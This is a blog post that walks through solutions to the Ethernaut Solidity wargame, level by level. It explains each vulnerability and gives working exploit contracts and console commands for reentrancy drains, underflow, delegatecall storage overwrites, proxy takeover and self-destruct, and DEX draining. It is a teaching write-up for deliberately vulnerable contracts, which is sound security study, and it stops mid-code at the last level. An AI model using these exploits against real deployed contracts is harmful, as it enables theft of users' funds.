---
layout: post
title: Every Ethernaut challenge, explained
---

The Ethernaut challenges are an **excellent** set of security oriented
Solidity challenges. I am proud to say I completed these challenges on
my own over the span of several weeks while I was learning Solidity.
Sometimes I'd finish multiple problems in a day. Other times I would be
stuck for hours on the same problem, only to come back and solve it a
few days later after I had acquired more knowledge.

Here are my solutions to the problems along with brief explanations.
Full [source code](https://github.com/daltyboy11/ethernaut-challenges/tree/main) is available on GitHub.

# Challenge List
1. [Hello Ethernaut](#hello-ethernaut)
2. [Fallback](#fallback)
3. [Fallout](#fallout)
4. [Coin Flip](#coin-flip)
5. [Telephone](#telephone)
6. [Token](#token)
7. [Delegation](#delegation)
8. [Force](#force)
9. [Vault](#vault)
10. [King](#king)
11. [Elevator](#elevator)
12. [Privacy](#privacy)
13. [Gatekeeper One](#gatekeeper-one)
14. [Gatekeeper Two](#gatekeeper-two)
15. [Naught Coin](#naught-coin)
16. [Preservation](#preservation)
17. [Recovery](#recovery)
18. [Magic Number](#magic-number)
19. [Alien Codex](#alien-codex)
20. [Denial](#denial)
21. [Shop](#shop)
22. [Dex](#dex)
23. [Dex Two](#dex-two)
24. [Puzzle Wallet](#puzzle-wallet)
25. [Motorbike](#motorbike)
26. [DoubleEntryPoint](#doubleentrypoint)


# Hello Ethernaut
In this challenge we're not given the source code, but only one starting function: `contract.info()`.

We follow the trail in the browser's developer console

```
>> await contract.info()
'You will find what you need in info1().'
>> await contract.info1()
'Try info2(), but with "hello" as a parameter.'
>> await contract.info2("hello")
'The property infoNum holds the number of the next info method to call.'
>> (await contract.infoNum()).toString()
'42'
>> await contract.info42()
'theMethodName is the name of the next method.'
>> await contract.theMethodName()
'The method name is method7123949.'
>> await contract.method7123949()
'If you know the password, submit it to authenticate().'
```

At this point, if we check the abi we can see there is a function called `password()`
and a function called `authenticate()`. We get the password and then authenticate
with it.

```
>> await contract.password()
'ethernaut0'
>> await contract.authenticate('ethernaut0')
... submit and mine tx
>> await contract.getCleared()
true
```

And that clears the level!

# Fallback
The contract has a payable `receive()` function that transfers ownership.
The goal is to trigger the receive function and gain ownership for ourselves.

When you call a contract without calldata either the `fallback()` or `receive()` function is called [1].

```
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

To pass the `contributions[msg.sender] > 0` requirement, we must first send ether via `contribute()`
with an amount less than 0.001 ether:

```
>> await contract.contribute({ value: toWei('0.0009') })
```

Now we can send ether to the contract and trigger fallback to `receive()`

```
>> let params = [{ to: instance, from: player, value: '0x01' }]
>> ethereum.request({ method: 'eth_sendTransaction', params })
>> await contract.owner() // verify owner change
<my address>
```

At this point you should be the owner of the contract. Now we can call `withdraw()` and drain the funds

```
>> await contract.withdraw()
```

And that clears the level!

# Fallout
This exploit relies on a typo in the constructor name. The contract name is `Fallout`
but the "constructor" name is `Fal1out`. The names are different which means `Fal1out`
isn't really constructor at all! It's just a regular function and we can call it
whenever we want. 

We can simply call `Fal1out` and claim ownership.
```
>> await contract.Fal1out()
```

**Note** this challenge was created before the `constructor` keyword was introduced to avoid these
mistakes.

And that clears the level!

# Coin Flip
Okay, this is the first exploit where we need to go beyond the console and write an
_exploit contract_. I like to use [Remix](https://remix.ethereum.org/) because it
makes it easy to deploy and debug contracts.

Let's analyze the contract. To predict the coinflip we need our `_guess` parameter to match
`blockValue.div(FACTOR)`. Let's further decompose that. We know `blockValue` is really just
`uint256(blockhash(block.number.sub(1)))` and `FACTOR` is the constant
`57896044618658097711785492504343953926634992332820282019728792003956564819968`. Therefore:

```
coinFlip =
blockValue.div(FACTOR) =
uint256(blockhash(block.number.sub(1))).div(57896044618658097711785492504343953926634992332820282019728792003956564819968)
```

The exploit contract uses this info to precompute the correct side:

```
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.0;

import "./CoinFlip.sol";

contract CoinFlipExploit {
    event Flip(bool success);
    uint constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address coinflip;

    constructor(address _coinflip) public {
        coinflip = _coinflip;
    }

    function guessCoinFlip() external {
        uint blockValue = uint(blockhash(block.number - 1));
        uint coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        bool result = CoinFlip(coinflip).flip(side);
        emit Flip(result); // Event to quickly confirm the result
    }
}
```

And then we can call `guessCoinFlip` 10 times for 10 consecutive wins (I used the remix IDE for this).

And that clears the level!

**Note** this challenge was created before the `constructor` keyword was introduced to avoid these
mistakes.

# Telephone
This level teaches us the difference between `tx.origin` and `msg.sender`.
The transaction origin is **always** the EOA that signs and broadcasts the
transaction. The message sender is _usually_ the account, be it EOA or contract,
that is the most recent caller of the execution environment (delegate calls are
an exception to this definition but you'll learn that in a future challenge).

We can write a an exploit contract to call `changeOwner`. The contract's address
will be `msg.sender` and your EOA will be `tx.origin`.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract TelephoneExploit {
    address private telephone;
    constructor(address _telephone) public {
        telephone = _telephone;
    }

    function exploit(address owner) external {
        Telephone(telephone).changeOwner(owner);
    }
}
```

And that clears the level!

# Token
In Solidity version `0.6.0` math is not safe by default. This means the `Token` contract is vulnerable to
an underflow exploit on this line:

```
require(balances[msg.sender] - _value >= 0);
```

If we call `transfer(address _to, uint _value)` such that `_value > balances[msg.sender]` then we cause an
underflow and bypass the `require`. Also `balances[msg.sender] -= _value` will set our balance to a 
_very high_ amount.

This exploit is simple enough to do in the console.
```
>> await contract.transfer('0x0000000000000000000000000000000000000000', '21')
>> (await contract.balanceOf(player)).toString()
'115792089237316195423570985008687907853269984665640564039457584007913129639935'
```

Now that's a big balance...

And that clears the level!

# Delegation
To understand this exploit we must understand _function signatures_ and _delegate calls_.
## Function signatures
As per the Solidity docs [2]:

> The first four bytes of the call data for a function call specifies the function to be called.
> It is the first (left, high-order in big-endian) four bytes of the Keccak-256 hash of the
> signature of the function. The signature is defined as the canonical expression of the basic
> prototype without data location specifier, i.e. the function name with the parenthesised list
> of parameter types. Parameter types are split by a single comma - no spaces are used.

So what's the function signature of `function pwn() public`? It's `abi.encodeWithSignature("pwn()")`,
i.e. the bytes `0xdd365b8b`.

## Delegate calls
When a contract is delegate called and manipulates its storage, it's actually _manipulating the storage
of the caller_. When Delegation uses `delegatecall` to call `pwn()` the line:

```
owner = msg.sender
```

is updating `owner` in Delegation, not Delegate. And don't get confused about the names
of the variables. It's not because they share the same name that it gets updated. It's
the _position_ that matters. The `owner` variable in Delegation is in the first storage
slot, and in Delegate it's **also** in the first storage slot, and that's why it gets
overwritten. To drive this point home we could change the name of the `owner` variable in
the `Delegation` contract and it would behave _the exact same way_:

```
contract Delegation {

  address public contractOwner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    contractOwner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

Another aspect of `delegatecall` is the message sender is preserved. When Delegation
calls Delegate the message sender is your EOA instead of the address of the Delegation.

## Exploit
Now we have everything we need to perform the exploit from the console.

```
>> let params = [{ to: instance, from: player, data: '0xdd365b8b' }]
>> await ethereum.request({ method: 'eth_sendTransaction', params })
```

And that clears the level!

# Force
We can force ether into a contract via `selfdestruct(address payable)`.
This is a built-in Solidity function. The receiving contract is unable
to reject the ether because `selfdestruct` **does not** trigger the `receive()`
function of the receiver [3].

We can load up our exploit contract with ether when we deploy it and then
selfdestruct it and send the ether to the `Force` contract:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceExploit {
    address payable private immutable force;
    constructor(address payable _force) public payable {
        force = _force;
    }

    function exploit() external {
        require(address(this).balance > 0, "exploit will only succeed with ether");
        selfdestruct(force);
    }
}
```

And that clears the level!

# Vault
To clear this level we have to read a private variable of the `Vault` contract.
Remember all the data is publicly available on-chain. Making a variable private
just makes it inaccessible from other contracts but we can still inspect it using
block explorers. In fact there's an JSON-RPC method to do it: `eth_getStorageAt` [4].
It takes 3 parameters:
1. The contract address to read storage from
2. The storage slot to read. We'll use slot 1 because that's the slot the password
   is in.
3. The block to read (because storage may get updated from block to block we have
   to be specific about which block we want). We want the latest block so we'll
use "latest"

We'll use the console to read the password and unlock the contract
```
>> let params = [instance, "0x01", "latest"]
>> let password = await ethereum.request({ method: 'eth_getStorageAt', params })
>> await contract.unlock(password)
```

And that clears the level!

# King
The key to this exploit is the unchecked transfer
```
king.transfer(msg.value)
```
It's a **bad** idea to execute an unchecked transfer to an address you don't
control. The receiver could do anything! In this case, if we construct a contract
that reverts on transfer we can prevent the `King` contract from updating the
king.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./King.sol";

contract KingExploit {
    address payable public immutable king;
    constructor (address payable _king) public {
        king = _king;
    }

    function becomeKing() public payable {
        (bool sent, bytes memory data) = king.call{value: msg.value}("");
        require(sent, "Failed to send Ether.");
    }

    receive() external payable {
        revert();
    }
}
```

And that clears the level!

# Re-entrancy
A contract can be vulnerable to a re-entrancy attack when it makes external
calls **before** updating its state. For example, consider a simple withdrawal
function:

```
function withdraw(uint256 amount) external {
    require(balances[msg.sender] >= amount, "Insufficient funds");
    msg.sender.call{value: amount}("");
    balances[msg.sender] -= amount;
}
```

This is highly problematic because a malicious contract can, upon receiving either
from `call`, re-enter the withdraw function and continue to withdraw ether
because its balance was never updated and will therefore satisfy the `require`
statement. This is exactly what we'll do with our exploit contract.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Reentrance.sol";

contract ReentranceExploit {
    uint private amount;
    Reentrance reentrance;

    constructor(address _reentrance) public {
        reentrance = Reentrance(_reentrance);
    }

    function exploit(uint _amount) external {
        amount = _amount;
        reentrance.withdraw(amount);
    }

    fallback() external payable {
        if (address(reentrance).balance > 0) {
            reentrance.withdraw(amount);
        }
    }
}
```

We initiate the exploit by calling `exploit` with the right amount. To drain the
entire contract, we need to make sure `_amount` evenly divides the contract's
total balance. The contract is initialized with a balance of 0.001 ether. We'll
deposit an additional 0.001 ether and run the exploit.

```
>> await contract.donate(<Address of ReentraceExploit>, { value: toWei('0.001') })
>> (await contract.balanceOf(i<Address of ReentranceExploit)).toString() // verify exploit contract balance
'1000000000000000'
>> await getBalance(instance)
'0.002'
```

Great! Now everything is set up to run the exploit. We're going to call `exploit`
with 0.001 ether. To make the exploit abundantly clear, let's follow the execution
path line by line

```
1. (ReentranceExploit) amount = _amount;
We set the amount contract variable. We'll need this when `fallback` is called.

2. (ReentranceExploit) reentrance.withdraw(amount);

3. (Reentrance) if(balances[msg.sender] >= _amount) {
We called withdraw with our balance amount, so we enter the if clause

4. (Reentrance) (bool result,) = msg.sender.call{value: _amount}("");
Sending ether via call will trigger ReentranceExploit's fallback function

5. (ReentranceExploit) if (address(reentrance).balance > 0) {
This is how we know when to stop. When the exploited contract's balance is 0 we
will stop reentering it.

6. (ReentranceExploit) reentrance.withdraw(amount);

7. (Reentrance) if(balances[msg.sender] >= _amount) {
We hit the if statement again. It checks out the `balances` mapping was **never**
updated!

8. (Reentrance) (bool result,) = msg.sender.call{value: _amount}("");

9. (ReentranceExploit) if (address(reentrance).balance > 0) {
The balance is 0 so the contract won't withdraw for a third time

10. (Reentrance) if(result) {...}

11. (Reentrance) balances[msg.sender] -= amount;
The balance is finally updated and the contract has been drained.
```

And that clears the level!

**Note**: Implement the Checks -> Effects -> Interactions pattern to mitigate
reentrancy attacks [5].

# Elevator
To exploit this contract we want to set `top` to `true` and `floor` to
`type(uint256).max`. The first time Elevator calls `isLastFloor()` we'll return
`false` to enter the if statement. Then for the second call we'll return `true`.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Elevator.sol";

contract ElevatorExploit is Building {
    bool private isFirstCall = true;
    address private immutable elevator;
    
    constructor(address _elevator) public {
        elevator  = _elevator;
    }

    function exploit() external {
        Elevator(elevator).goTo(type(uint256).max);
    }
    
    function isLastFloor(uint256 floor) external override returns (bool) {
        if (isFirstCall) {
            isFirstCall = false;
            return false;
        } else {
            return true;
        }
    }
}
```

And that clears the level!

# Privacy
To clear this level we need to understand how storage slots work. In summary
1. A slot is a 32 byte word
2. The slot of a storage variable is determined by its declaration ordering
3. When possible, smaller storage variables will share the same slot to save space

Let's look at the Privacy's variables and see which slot each one
belongs to:

```
// A boolean uses a single byte. This goes in the first slot (slot0)
bool public locked = true;

// A uint256 value takes up an entire 32 byte word. It can't fit in slot0
// because 1 byte is already used for `locked`, so it goes in slot1.
uint256 public ID = block.timestamp;

// 1 byte, goes in slot2.
uint8 private flattening = 10;

// 1 byte, also goes in slot2.
uint8 private denomination = 255;

// 2 bytes, also goes in slot2 (we have now allocated 4 bytes in slot2).
uint16 private awkwardness = uint16(now);

// Fixed-size arrays are packed the same way as normal variables.
// data[0] cannot fit in slot2 because it needs 32 bytes, so it goes in slot3
// data[1] goes in slot4
// data[2] goes in slot5
bytes32[3] private data;
```

Recall our handy `eth_getStorageAt` JSON-RPC method. We can use this to figure out
the contents of `data[2]`.

```
> let params = [<Privacy Address>, '0x05', 'latest']
> await ethereum.request({ method: 'eth_getStorageAt', params })
'0x626c3037765f6a2f842270bbfc27bceb43552e8ffce4eca3d86a9c52aa86d7e6'
```

What happens when we cast data[2] to `bytes16`? Bytes in the EVM are _big endian_
so the most significant byte is the smallest memory address. When reading 32 byte
words from left to right, the memory addresses go from smaller to larger and the
most significant byte is on the left.

Concrete example: the most significant byte of `data[2]` is `0x62`
and its least siginificant byte is `0xe6`.

A bytecast truncates the larger data addresses so if we convert
`0x626c3037765f6a2f842270bbfc27bceb43552e8ffce4eca3d86a9c52aa86d7e6` to `bytes16`
we get `0x626c3037765f6a2f842270bbfc27bceb`. This is our key!

```
>> await contract.unlock('0x626c3037765f6a2f842270bbfc27bceb')
```

And that clears the level!

# Gatekeeper One
We need to get past three gates here. Let's tackle them one by one.

## Gate one
It's easy to get past the first gate. We simply need to route our transaction
through an intermediary contract like we did in the _Telephone_ challenge.

## Gate two
The second gate is a bit more involved than the first. How can we set the
gas of our transaction such that at the exact moment we check `gasleft()`
we have the right amount? For this I used the Remix debugger. Here's the
exploit contract I worked with

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./GatekeeperOne.sol";

contract GatekeeperOneExploit {
    GatekeeperOne gatekeeperOne;

    constructor(address _gatekeeperOneAddress) public {
        gatekeeperOne = GatekeeperOne(_gatekeeperOneAddress);
    }

    function callEnter(uint256 gas, bytes8 gateKey) external returns (bool) {
        return gatekeeperOne.enter{gas: gas}(gateKey);
    }
}
```

Using my exploit contract I called `enter()` with 3000000 total gas and
1000000 gas forwarded. As expected it passed the first gate but it reverted
on the second. I observed  in the debugger that after the `GAS` opcode call
(which pushes the gas left onto the execution stack) there is 999746 gas
left. So of the 1000000 gas given to the contract, it consumes 1000000 - 999746 = **254**
gas before the second gate check. Thus, we want to  call `enter` with a
gas amount `x` such that `(x - 254) % 8191 == 0`. Let's use `8191254`.
This gets us past gate two.

## Gate three
To get past gate three we have to understand byte to integer conversions.
A `bytes8` value has the same size as a `uint64` value (recall type `uintx`
is an unsigned integer of `x` bits). Let's analyze this gate line by line:

```
require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), ...);
```

The `uint32` cast is truncating `_gateKey` to its 32 least significant bits
and the `uint16` cast is truncating `_gateKey` to its 16 least significant bits.

E.g. if `_gateKey` is `0x1122334455667788` then
1. `uint32(uint64(_gateKey))` is 0x55667788 (in hex)
2. `uint16(uint64(_gateKey))` is 0x00007788 (in hex, padded with leading 0's)

To make them equal, we must choose a number with 0's in the third and fourth bytes.
We'll use `0x1122334400007788`. You can verify in the debugger this passes the first
`require` line.

The next line is
```
require(uint32(uint64(_gateKey)) != uint64(_gateKey), ...);
```

Again, the `uint32` cast truncates the first 4 bytes. The `uint64` cast
truncates nothing. So with `0x1122334400007788` for our key we have
1. `uint32(uint64(_gateKey))` is `0x0000000000007788` (in hex, padded with leading 0's)
2. `uint64(_gateKey)` is `0x1122334400007788`

To make sure they're not equal, at least one of the first four bytes from the `uint64`
should be non-zero. Our existing key works, but we can make it more minimal. Our updated
_gateKey is `0x1000000000007788`. You can verify this gets us past the second line.

The last line is
```
require(uint32(uint64(_gateKey)) == uint16(tx.origin), ...);
```

Suppose the origin is `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4`

1. `uint32(uint64(_gateKey))` is `0x00007788`
2. `uint16(tx.origin)` is the last two bytes of the address, which is `0x0000ddC4` (padded with leading zeros)

To make them equal we just have to replace `0x7788` with `0xddC4` (you should use the last two bytes of your EOA). Our updated key
is `0x100000000000ddC4`. That gets us past the final gate.

And that clears the level!

# Gatekeeper Two
Just like Gatekeeper One we'll tackle this gate by gate.

## Gate One
You've seen this one before ;)

## Gate two
The `CALLER` opcode returns the address of the calling entity.
It could be a contract or an EOA.  The `EXTCODESIZE` opcode
returns the length of the contract bytecode at the supplied address.

So the lines
```
assembly { x := extcodesize(caller()) }
require(x == 0);
```

are checking that the caller has 0 contract code. But how can we
use a contract to bypass the first gate but at the same time pass
the second gate, if by default a contract has non-zero byte code?

The answer lies in knowing the special scenario when your contract
can execute but will also return `0` for a call to `extcodesize(caller())`:
in the constructor. During contract initialization the constructor is called
but the contract bytecode is still 0. This is because the contract's runtime
bytecode isn't actually stored on chain until the constructor has finished
executing.  Thus, we can pass the second gate by doing our call's from the
exploit contract's constructor...

## Gate three
Recall the `^` operator is a bitwise XOR. Also, the inverse of XOR is XOR.
So if we have `X ^ Y = Z` we have `Y = X ^ Z`. We can compute our gate key
directly in our exploit contract as follows:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./GatekeeperTwo.sol";

contract GatekeeperTwoExploit {
    constructor(address gatekeeper) public {
        uint64 gateKey = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1);
        GatekeeperTwo(gatekeeper).enter(bytes8(gateKey));
    }
}
```

And that clears the level!

# Naught Coin
The ERC20 specification supports two ways to transfer [6]:
1. A direct transfer
2. An approval followed by a transferFrom by a third party

The vulnerable contract time locks `transfer` but puts no
restrictions on `transferFrom`. We'll use `transferFrom`
to move the tokens.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol";

contract NaughtCoinExploit {
    function exploit(address erc20, address owner, address receiver, uint256 amount) external {
        IERC20(erc20).transferFrom(owner, receiver, amount);
    }
}
```

We'll deploy the contract and call approve from the console.

```
>> await contract.approve(<exploit contract address>, '1000000000000000000000000')
```

Now use the `exploit` function to transfer the funds.

And that clears the level!

# Preservation
We'll have to dust off our knowledge from the _Delegation_ level to tackle this one.
The vulnerable contract stores `timeZone1Library` in slot0 and the library contract
stores `storedTime` in slot 0. When `setFirstTime` delegates to `LibraryContract` and
we update `storedTime` we're actually updating slot0 in the `Preservation` contract.
We can update it to be the address of the exploit contract. The next step is to call
`setFirstTime` again to delegate to our exploit contract and update the owner.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Preservation.sol";

contract Exploit {
    address public preservation;
    address public slot2;
    address public owner;

    constructor(address _preservation) public {
        preservation = _preservation;
    }

    function exploit() external {
        // After execution slot0 of the preservation contract will point to us
        // So the next time we delegate call it it will come here
        Preservation(preservation).setFirstTime(uint256(address(this)));
    }
    
    function setFirstTime(uint256 _timestamp) external {
         // Delegate called from Preservation.sol, will update the owner of Preservation.sol
        owner = 0x... // your EOA goes here
    } 
}
```

We call `exploit()` and now `timeZone1Library` points to the exploit contract.
Then we can use the console to call the `setFirstTime` and overwrite the owner.

```
>> await contract.setFirstTime('0')
```

And that clears the level!

# Recovery
To recover the "lost" contract we can look at our instance contract on etherscan.
Observe the most recent internal transaction is a contract creation. This is our
SimpleToken contract.

We can just load the contract up on Remix and call `selfdestruct` on it.

And that clears the level!

# Magic Number
This one requires a thorough understanding of bytecode and the EVM. Solving this
problem took more time than **any other** because I did a deep dive on the EVM and
writing raw bytecode. I **highly recommend** you read this [five part series](https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-i-introduction-832efd2d7737/)
before proceeding. It's well worth your time if you're serious about being a
Solidity engineer.

The following bytecode is to deploy a contract that will respond to `whatIsTheMeaningOfLife()` with `42`. After reading
the 5 part series you should be able to understand every line.
```
####################
Creation bytecode
####################
# Free memory
000 PUSH1 80 (6080)
002 PUSH1 40 (6040)
004 MSTORE   (52)
# Load runtime bytecode to memory
005 PUSH1 0a (600a) # runtime code size
007 PUSH1 11 (6011) # 0x11 is line 17, the start of the runtime code
009 PUSH1 80 (6080) # starting location in memory
011 CODECOPY (39) # copy 0x0a (10) bytes of code at code location (xx) to memory location 0x80
012 PUSH1 0a (600a)
014 PUSH1 80 (6080)
016 RETURN # (f3) return 0x0a bytes of memory starting at memory location 0x80

####################
Runtime bytecode
####################
# Runtime bytecode
## Total bytes: 10 (0xa)
017 PUSH1 2a (602a) # 42 in decimal
019 PUSH1 80 (6080) # free memory location
021 MSTORE   (52)
022 PUSH1 20 (6020)
024 PUSH1 80 (6080)
026 RETURN   (f3)

####################
All of the bytecode put together
####################
0x6080604052600a6011608039600a6080f3602a60805260206080f3
```

The last line is what we actually submit in the transaction. 
```
>> let bytecode = '0x6080604052600a6011608039600a6080f3602a60805260206080f3'
// The following request will create a new contract. Fetch its address from etherscan
>> await ethereum.request({ method: 'eth_sendTransaction', params: [{ data: bytecode, from: player }]})
```

Now we just need to set the solver
```
await contract.setSolver(<deployed contract address>)
```

And that clears the level!

# Alien Codex
The exploit takes advantage of the way arrays used to work (I can't remember
in which version of Solidity this was patched): the `length` property of an
array could be updated independently of the its contents :O.

We can underflow the codex array's `length` by calling `retract()` when
the array has 0 elements. Then the length of the array will be 2**256-1. This
gives us the ability to overwrite any storage slot we want because the size
of the array covers all possible slots.

We can do the underflow through the console:
```
>> await contract.make_contact()
>> await contract.retract()
```

Now codex.length is `0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF`

Where is the first element of `codex` stored? If we read _Layout of State Variables in Storage_
from the Solidity docs [7] it tells us array elements are stored at the offset `keccak256(p)`,
where `p` is the storage slot of the array. The `codex` array is in slot 2 so the offset is
`array_slot = keccak256(abi.encodePacked(2)) = 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6`.

The `owner` variable is in slot0. We want to call `revise(i,_content)` such that
1. We cause an overflow and `i + array_slot == 0`
2. `_content` is our EOA address

I'll leave the details of the math as an exercise for the reader ;).

```
>> await contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938', <EOA>)
```

And that clears the level!

# Denial
I call this a _gas depletion_ exploit. This contract is vulnerable because the author believes
incorrectly that the line

```
partner.call{value:amountToSend}("");
```

will always continue execution even if the receiving contract reverts. This is true... if the
receiving contract reverts then that doesn't cause the error to propagate. BUT, the `Denial`
contract doesn't specify how much gas to forward. By default `call` forwards ALL remaining
gas. And unlike the `REVERT` opcode, which will refund gas to the caller, the `INVALID`
opcode will not.

We can create a malicious contract that executes the `INVALID` opcode to take all of `Denial`'s
gas. This will deny the owner from withdrawing funds.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract DenialExploit {
    receive() external payable {
        assembly {
            invalid()
        }
    }
}
```

We could have also wrote an exploit contract with an infinite loop that exhausted all the
gas but I think the `INVALID` opcode is more elegant :P.

And that clears the level!

# Shop
As a view function `price` cannot modify any state. But we can read the state of other contracts!
And if the state of another contract changes between successive calls then we can use that
information to change the value returned by the view function. We can alter the price returned
based on Shop's `isSold` variable. When `isSold` is `false` we can return 100 for the price.
When it's `true` we can return 0:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "./Shop.sol";

contract ShopExploit {
    address private immutable shop;
    constructor(address _shop) {
        shop = _shop;
    }

    function price() external view returns (uint) {
        if (Shop(shop).isSold())
            return 0;
        return 100;
    }

    function exploit() external {
        Shop(shop).buy();
    }
}
```

And that clears the level!

# Dex
This exploit relies on the Dex's incorrect pricing function.
We start with 10 of each token and the Dex with 100 of each token.

In our first swap we can exchange 10 of token 1 for 10 of 
token 2 (you can verify this with the `get_swap_price`) function.
This leaves the Dex with 110 of t1 and 90 of t2.

In our second swap we can exchange 10 of t2 for ~12.22 t1.
This leaves the Dex with 97.78 of t1 and 102.22 of t2.

In our third swap we can exchange 12.22 t1 for 12.77 t2.

Each time it swaps it gives us the price of x tokens for what should
really just be the price of the first token. A good DEX would increase
the price with each successive token exchange as the scarcity of the
token received increases.

But because of this flawed pricing function we obtain a token amount larger than
what we put in in each successive swap. Many repeated swaps can drain the contract.

You can either write a contract to automate this or swap directly from the browser
console.

And that clears the level!

# Dex Two
`DexTwo` is identical to `Dex` except it's missing the first require statement
in the swap function:

```
require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
```

Dex Two isn't actually checking that `from` and `to` are the same tokens the
contract was initialized with! We can exploit this Dex by substituting our
malicious `ERC20` contract as the `from` token.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol";

contract DexTwoExploit is ERC20 {
    address public immutable dex;

    constructor(string memory _name, string memory _symbol, address _dex) ERC20(_name, _symbol) {
        dex = _dex;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return 100;
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        return true;
    }
}
```

Let's call our exploit token `POOP`. We can easily drain the Dex contract with
just two calls to the swap function:

```
>> await contract.swap(POOP, token1, '100')
>> await contract.swap(POOP, token2, '100')
```

And that clears the level!

# Puzzle Wallet
This is one of my favorite levels because it feels the most like a real exploit.
The vulnerability lies in the proxy and logic contract storage collisions.

By setting `pendingAdmin` in the proxy, we're changing the value of `owner` in
PuzzleWallet (when PuzzleWallet is delegate called from the proxy), because they
share the same storage slot. Similarly, setting `maxBalance` in PuzzleWallet when 
it is delegate called by the proxy will change `admin` in the proxy. To avoid these
kinds of errors your proxy and implementation **must** have the same storage layout!

But how do we update `maxBalance`? The only way is to drain the contract first...
There's another trick we take advantage of besides the shared storage. The logic for
checking if `deposit()` is only called once in `multicall` is incorrect. We can call
deposit as many times as we want by calling `multicall` from itself! `msg.value`
is preserved in the delegate call so we can arbitrarily add to our balance.

Here's the exploit contract with comments to explain:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "./PuzzleWallet.sol";

contract PuzzleProxyExploit {

    PuzzleProxy public immutable proxy;
    PuzzleWallet public immutable wallet;

    constructor(address payable _puzzleWallet) public {
        proxy = PuzzleProxy(_puzzleWallet);
        wallet = PuzzleWallet(_puzzleWallet);
    }

    bytes[] private topLevelCalls;
    bytes[] private nestedCall;
    function exploit(address newAdmin) public payable {
        require(msg.value == 1000000000000000);

        // Set `pendingAdmin` in proxy to this address to change `owner` in wallet
        proxy.proposeNewAdmin(address(this));
        // We're the owner now so we can add ourself to the whitelist
        wallet.addToWhitelist(address(this));

        // The first call to multicall will be `deposit`
        // The second call will be a call to `multicall`, which itself
        // performs a call to `deposit`
        // 
        // This allows us to deposit twice and increase our balance by 2 * msg.value
        // (we can repeat this an arbitrary number of times)
        topLevelCalls.push(abi.encodeWithSelector(PuzzleWallet.deposit.selector));
        nestedCall.push(abi.encodeWithSelector(PuzzleWallet.deposit.selector));
        topLevelCalls.push(abi.encodeWithSelector(PuzzleWallet.multicall.selector, nestedCall));
        wallet.multicall{value: msg.value}(topLevelCalls);

        // Now our balance equals the total contract balance. Drain via `execute`
        bytes memory callData; // empty calldata, just need it as a placeholder
        wallet.execute(newAdmin, 2000000000000000, callData);

        // Finally set the max balance now that the wallet balance is 0.
        // Updating maxBalance in the wallet updates the admin in the proxy
        wallet.setMaxBalance(uint256(newAdmin));
    }
}
```

And that clears the level!

# Motorbike
This exploit relies on the fact that Engine remains uninitialized even after
Motorbike is created. This is because the call to `initalize()` in Motorbikes's
constructor is delegate called. The motorbike storage is used for the
initialization but the engine's storage remains untouched. We can call initialize on
the engine ourselves and set the implementation to our exploit contract.

The first step is to get the address of the engine contract. According to EIP-1967 the
proxy stores the impl address at slot `0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc` [8]:

```
>> let slot = '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'
>> let impl = await ethereum.request({ method: 'eth_getStorageAt', params: [instance, slot, "latest"]})
```

Then we can pass the impl to the exploit contract

```
// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

import "./Engine.sol";

contract EngineExploit {
    function exploit(address engine) external {
        Engine(engine).initialize();
        Engine(engine).upgradeToAndCall(address(this), abi.encodeWithSelector(this.kill.selector));
    }

    function kill() external {
        selfdestruct(address(0));
    }
}
```

The next time the engine tries to call a function it'll go straight to `kill()`.
Bye bye, engine :'(.

And that clears the level!

# DoubleEntryPoint
I'll admit it took me some time to wrap my head around what's going on in these contracts
but after a couple of hours I figured it out.

The desired behavior of CryptoVault is that it can sweep any token **except** the
underlying DET token. But the problem is we can sweep DET indirectly by sweeping
LegacyToken. LegacyToken's `transfer()` function calls DET's `delegateTransfer()`.
If you look at the source code you'll see this simply transfers DET. Therefore we
can drain the vault of DET by calling `sweepToken(<LegacyToken Address>)`.

So how do we prevent this? The Forta bot contract should raise an alert if the `origSender`
param is CryptoVault's address because this indicates DET being transferred _out of_ the vault.

Here's the bot:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

